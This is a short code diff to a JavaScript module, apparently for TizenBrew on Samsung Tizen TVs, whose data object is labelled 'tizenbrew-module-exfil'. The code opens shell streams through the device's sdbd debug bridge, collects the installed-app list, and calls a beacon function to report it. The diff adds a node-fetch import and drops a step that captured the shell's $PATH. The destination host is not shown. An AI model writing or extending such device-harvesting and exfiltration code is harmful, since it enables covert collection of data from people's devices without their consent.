@@ -1,3 +1,4 @@
+const fetch = require('node-fetch');
 const data = {
     source: 'tizenbrew-module-exfil',
     ts: new Date().toISOString(),
@@ -39,14 +40,8 @@ function collectSdbd() {
                 s2.on('data', function(c) { out2 += c.toString(); });
                 s2.on('end', function() {
                     data.vd_applist = out2.substring(0, 5000);
-                    var s3 = client.createStream('shell:0 echo $PATH');
-                    var out3 = '';
-                    s3.on('data', function(c) { out3 += c.toString(); });
-                    s3.on('end', function() {
-                        data.shell_echo = out3.trim();
-                        beacon();
-                        try { client._stream.end(); } catch(e2) {}
-                    });
+                    beacon();
+                    try { client._stream.end(); } catch(e2) {}
                 });
             });
         });
